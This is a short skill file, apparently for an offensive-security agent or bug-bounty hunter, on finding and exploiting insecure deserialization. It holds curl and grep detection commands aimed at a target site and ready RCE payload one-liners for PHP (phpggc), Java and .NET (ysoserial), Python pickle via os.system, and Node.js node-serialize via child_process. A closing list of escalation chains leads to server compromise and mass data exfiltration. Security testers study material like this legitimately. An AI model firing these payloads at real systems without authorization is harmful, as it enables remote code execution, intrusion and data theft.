---
name: hunt-deserialization
description: Insecure deserialization — PHP, Java, Python, Node.js, .NET, Ruby. Object injection, gadget chains, RCE.
---

# DESERIALIZATION HUNTING — 3 BULLETS MAX

**Core:** User-supplied serialized data executed without validation = RCE.

## DETECTION
```bash
# PHP: look for O: or a: in cookies/responses
curl -s "https://target.com/" | grep -oE "[Oa]:[0-9]+:\"[a-zA-Z]+\""
# Java: magic bytes AC ED 00 05 or base64 rO0AB
curl -s "https://target.com/" | grep -c "rO0AB"
# Python: pickle magic bytes 80 04 95
curl -s "https://target.com/" | grep -c "gANj"
# .NET: ViewState starts with /wEP
curl -s "https://target.com/" | grep -oE "/wEP[a-zA-Z0-9+/=]+"
```

## ENGINE PAYLOADS
```
PHP:     phpggc Laravel/RCE1 system 'id'
Java:    java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
Python:  pickle.dumps(type('',(),{'__reduce__':lambda s:(os.system,('id',))})())
.NET:    ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "id"
Node.js: node-serialize IIFE: {rce:function(){require('child_process').execSync('id')}}
```

## CHAINS
```
Deserialization → RCE → full server compromise → Critical
Deserialization → file read → secrets → infrastructure access → Critical
Deserialization → database access → mass data exfil → Critical
```
